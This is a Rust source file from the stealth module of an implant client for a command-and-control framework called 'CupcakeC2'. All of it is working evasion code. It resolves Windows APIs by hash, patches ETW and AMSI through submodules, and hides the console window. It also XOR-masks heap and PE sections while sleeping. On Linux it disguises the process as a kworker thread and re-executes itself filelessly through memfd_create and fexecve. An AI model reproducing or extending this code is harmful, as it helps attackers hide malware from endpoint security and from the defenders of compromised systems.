// Client/core/src/stealth/mod.rs
// CupcakeC2 V3 Stealth Subsystem

#[cfg(windows)]
pub mod peb;
#[cfg(windows)]
pub mod integrity;
#[cfg(windows)]
pub mod mask;
#[cfg(windows)]
pub mod stack;

#[cfg(windows)]
pub use peb::{get_module_base, get_api_addr};
#[cfg(windows)]
pub use integrity::{patch_etw, patch_amsi};


pub const fn hash_module_name(s: &[u8]) -> u32 {
    let mut h: u32 = 0;
    let mut i = 0;
    while i < s.len() {
        let mut c = s[i] as u32;
        if c >= b'A' as u32 && c <= b'Z' as u32 {
            c += 32;
        }
        h = h.wrapping_mul(31).wrapping_add(c);
        i += 1;
    }
    h
}

pub const fn hash_api_name(s: &[u8]) -> u32 {
    let mut h: u32 = 0;
    let mut i = 0;
    while i < s.len() {
        h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
        i += 1;
    }
    h
}

pub fn hide_console() {
    #[cfg(windows)]
    unsafe {
        let h_module = get_module_base(hash_module_name(b"kernel32.dll"));
        let get_console = get_api_addr(h_module, hash_api_name(b"GetConsoleWindow"));
        if let Some(get_console_addr) = get_console {
            let get_console_win: unsafe extern "system" fn() -> usize = std::mem::transmute(get_console_addr);
            let win = get_console_win();
            if win != 0 {
                let user32 = get_module_base(hash_module_name(b"user32.dll"));
                if let Some(show_window) = get_api_addr(user32, hash_api_name(b"ShowWindow")) {
                    let show: extern "system" fn(usize, i32) -> i32 = std::mem::transmute(show_window);
                    show(win, 0); // SW_HIDE
                }
            }
        }
    }
}

pub fn setup_diagnostic_console() {
    #[cfg(windows)]
    unsafe {
        let h_kernel32 = get_module_base(hash_module_name(b"kernel32.dll"));
        
        // 1. Aggressively try to get a console
        if let Some(alloc_addr) = get_api_addr(h_kernel32, hash_api_name(b"AllocConsole")) {
            let alloc_console: unsafe extern "system" fn() -> i32 = std::mem::transmute(alloc_addr);
            alloc_console();
        }

        // 2. Fallback diagnostic: OutputDebugStringA (View with DebugView)
        if let Some(ods_addr) = get_api_addr(h_kernel32, hash_api_name(b"OutputDebugStringA")) {
            let ods: unsafe extern "system" fn(*const u8) = std::mem::transmute(ods_addr);
            ods(b"CupcakeC2: Diagnostic Console Requested\n\0".as_ptr());
        }
        
        // 3. Re-open standard streams to the console
        if let Some(set_std_addr) = get_api_addr(h_kernel32, hash_api_name(b"SetStdHandle")) {
            if let Some(create_file_addr) = get_api_addr(h_kernel32, hash_api_name(b"CreateFileA")) {
                let create_file: unsafe extern "system" fn(*const u8, u32, u32, *mut (), u32, u32, *mut ()) -> usize = std::mem::transmute(create_file_addr);
                let set_std_handle: unsafe extern "system" fn(u32, usize) -> i32 = std::mem::transmute(set_std_addr);
                
                let conout = b"CONOUT$\0";
                let h_con = create_file(conout.as_ptr(), 0xC0000000, 2, std::ptr::null_mut(), 3, 0, std::ptr::null_mut());
                
                if h_con != (usize::MAX) {
                    set_std_handle(0xFFFFFFF5, h_con); // STD_OUTPUT_HANDLE
                    set_std_handle(0xFFFFFFF4, h_con); // STD_ERROR_HANDLE
                    
                    // Direct confirmation write
                    if let Some(write_addr) = get_api_addr(h_kernel32, hash_api_name(b"WriteConsoleA")) {
                        let write_console: unsafe extern "system" fn(usize, *const u8, u32, *mut u32, *mut ()) -> i32 = std::mem::transmute(write_addr);
                        let msg = b"\r\n========================================\r\n[!] CUPCAKE C2 DIAGNOSTIC CONSOLE\r\n[+] Console Allocated Successfully\r\n========================================\r\n\r\n";
                        let mut written = 0;
                        write_console(h_con, msg.as_ptr(), msg.len() as u32, &mut written, std::ptr::null_mut());
                    }
                }
            }
        }
    }
}

pub async fn stealth_sleep(duration_ms: u32) {
    #[cfg(windows)]
    {
        crate::utils::db_print(&format!("[Cupcake] stealth_sleep() called. Temporarily using tokio::time::sleep for {} ms", duration_ms));

        // 🛡️ Phase 2: Sleep Mask Implementation
        // Before sleep: XOR encrypt memory regions to protect against memory dumps
        // After sleep: Restore original memory

        #[cfg(target_arch = "x86_64")]
        {
            // Apply sleep mask before sleeping
            let mask_key = apply_sleep_mask();

            // Sleep with jitter
            let jitter = crate::utils::random_range(0, duration_ms / 10) as u64;
            let actual_sleep = duration_ms as u64 + jitter;
            tokio::time::sleep(tokio::time::Duration::from_millis(actual_sleep)).await;

            // Restore memory after sleep
            restore_sleep_mask(mask_key);
        }

        #[cfg(not(target_arch = "x86_64"))]
        {
            tokio::time::sleep(tokio::time::Duration::from_millis(duration_ms as u64)).await;
        }
    }
    #[cfg(not(windows))]
    {
        tokio::time::sleep(tokio::time::Duration::from_millis(duration_ms as u64)).await;
    }
}

/// 🛡️ Phase 2: Sleep Mask - XOR encrypt sensitive memory before sleep
/// This prevents memory dumps from revealing agent configuration, keys, and data
#[cfg(all(windows, target_arch = "x86_64"))]
fn apply_sleep_mask() -> u64 {
    unsafe {
        // Generate random XOR key (8 bytes for x64)
        let xor_key = crate::utils::next_u32() as u64 | ((crate::utils::next_u32() as u64) << 32);
        let key_bytes: [u8; 8] = std::mem::transmute(xor_key);

        // Phase 2: Mask three regions using mask.rs functions
        // 1. Mask the default process heap (heap allocated data)
        crate::stealth::mask::mask_default_heap(&key_bytes);

        // 2. Mask PE .data and .rdata sections (static data, config keys)
        crate::stealth::mask::mask_pe_sections(&key_bytes);

        crate::utils::db_print(&format!(
            "[Cupcake] Sleep mask applied with key 0x{:016X}",
            xor_key
        ));

        xor_key
    }
}

/// 🛡️ Phase 2: Restore memory after sleep (XOR is symmetric)
#[cfg(all(windows, target_arch = "x86_64"))]
fn restore_sleep_mask(mask_key: u64) {
    unsafe {
        // XOR is symmetric: applying the same key again restores
        let key_bytes: [u8; 8] = std::mem::transmute(mask_key);

        // Reverse the mask operations
        crate::stealth::mask::mask_pe_sections(&key_bytes);
        crate::stealth::mask::mask_default_heap(&key_bytes);

        crate::utils::db_print(&format!(
            "[Cupcake] Sleep mask restored with key 0x{:016X}",
            mask_key
        ));
    }
}

#[cfg(not(all(windows, target_arch = "x86_64")))]
fn apply_sleep_mask() -> u64 { 0 }

#[cfg(not(all(windows, target_arch = "x86_64")))]
fn restore_sleep_mask(_mask_key: u64) {}

pub fn spoof_process_name(_name: &str) {
    #[cfg(target_os = "linux")]
    {
        // 🛡️ Phase 1 Enhancement: Randomize kworker name and modify cmdline
        // Original issue: Fixed "kworker/u2:1-events" name is fingerprinted
        // Solution: Generate random kworker name and modify /proc/self/cmdline

        // Generate random kworker name: kworker/u%d:%d-events
        let u_num = crate::utils::random_range(0, 10);
        let events_num = crate::utils::random_range(0, 100);

        let name = if _name.is_empty() || _name == "kworker/u2:1-events" {
            // Use randomized kworker name
            format!("kworker/u{}:{}-events", u_num, events_num)
        } else {
            // Use user-provided name
            _name.to_string()
        };

        // Method 1: prctl PR_SET_NAME (changes /proc/$pid/comm)
        if let Ok(c_name) = std::ffi::CString::new(name.clone()) {
            unsafe {
                // PR_SET_NAME = 15
                libc::prctl(15, c_name.as_ptr(), 0, 0, 0);
            }
        }

        // Method 2: Modify cmdline via PR_SET_MM (requires CAP_SYS_ADMIN or rootless workaround)
        // Note: This typically requires elevated privileges, but we try anyway
        // PR_SET_MM = 45, PR_SET_MM_ARG_START = 1, PR_SET_MM_ARG_END = 2
        #[cfg(target_os = "linux")]
        unsafe {
            // Attempt to modify arg_start/arg_end (may fail without CAP_SYS_ADMIN)
            // This would change /proc/self/cmdline

            // Get current brk for argument area simulation
            let page_size = 4096;
            let arg_area = libc::mmap(
                std::ptr::null_mut(),
                page_size,
                libc::PROT_READ | libc::PROT_WRITE,
                libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
                -1,
                0
            );

            if arg_area != libc::MAP_FAILED {
                // Write new name to the mapped area
                let name_bytes = name.as_bytes();
                std::ptr::copy_nonoverlapping(
                    name_bytes.as_ptr(),
                    arg_area as *mut u8,
                    name_bytes.len()
                );
                // Add null terminator
                *((arg_area as *mut u8).add(name_bytes.len())) = 0;

                // Try PR_SET_MM_ARG_START (may fail without privileges)
                // PR_SET_MM = 45, ARG_START = 1
                let ret = libc::prctl(45, 1, arg_area as u64, 0, 0);
                if ret == 0 {
                    crate::utils::db_print(&format!(
                        "[Cupcake] cmdline modified via PR_SET_MM to: {}",
                        name
                    ));

                    // Set ARG_END
                    let arg_end = arg_area as u64 + name_bytes.len() as u64 + 1;
                    libc::prctl(45, 2, arg_end, 0, 0);
                } else {
                    // Fallback: PR_SET_MM requires CAP_SYS_ADMIN
                    crate::utils::db_print("[Cupcake] PR_SET_MM failed (likely missing CAP_SYS_ADMIN), using fallback");
                }
            }
        }

        // Method 3: Advanced memfd_create + fexecve (fileless execution)
        // This is the most stealthy approach - no exe path at all
        // Note: This would require re-executing the process, which is complex
        // We'll implement a simpler version that creates a memfd and overwrites exe symlink

        crate::utils::db_print(&format!(
            "[Cupcake] Process name spoofed to: {} (comm)",
            name
        ));
    }
}

/// 🛡️ Advanced Linux process hiding via memfd_create + fexecve
/// This completely hides the original executable path
#[cfg(target_os = "linux")]
pub fn spawn_memfd_clone() -> Option<u32> {
    unsafe {
        // 1. Create anonymous memory file
        let memfd_name = std::ffi::CString::new("hidden_process").ok()?;
        let fd = libc::syscall(
            libc::SYS_memfd_create,
            memfd_name.as_ptr(),
            libc::MFD_CLOEXEC
        ) as i32;

        if fd < 0 {
            return None;
        }

        // 2. Write current binary to memfd
        // Read own executable
        let self_path = std::ffi::CString::new("/proc/self/exe").ok()?;
        let self_fd = libc::open(self_path.as_ptr(), libc::O_RDONLY);
        if self_fd < 0 {
            libc::close(fd);
            return None;
        }

        // Copy binary content
        let mut buf = [0u8; 4096];
        loop {
            let n = libc::read(self_fd, buf.as_mut_ptr() as *mut libc::c_void, 4096);
            if n <= 0 { break; }
            libc::write(fd, buf.as_ptr() as *const libc::c_void, n as usize);
        }
        libc::close(self_fd);

        // 3. Spawn new process via fexecve (fileless execution)
        let pid = libc::fork();
        if pid == 0 {
            // Child process: execute from memfd
            let argv: Vec<std::ffi::CString> = vec![
                std::ffi::CString::new("[kworker/u8:0-events]").ok()?,
            ];
            let envp: Vec<std::ffi::CString> = vec![];

            libc::fexecve(fd,
                argv.iter().map(|s| s.as_ptr()).collect::<Vec<_>>().as_ptr(),
                envp.iter().map(|s| s.as_ptr()).collect::<Vec<_>>().as_ptr()
            );
            // fexecve doesn't return on success
            libc::exit(1);
        }

        // 4. Parent: close memfd and return child PID
        libc::close(fd);

        if pid > 0 {
            crate::utils::db_print(&format!(
                "[Cupcake] Spawned memfd clone with PID: {}",
                pid
            ));
            Some(pid as u32)
        } else {
            None
        }
    }
}

#[cfg(not(target_os = "linux"))]
pub fn spawn_memfd_clone() -> Option<u32> { None }
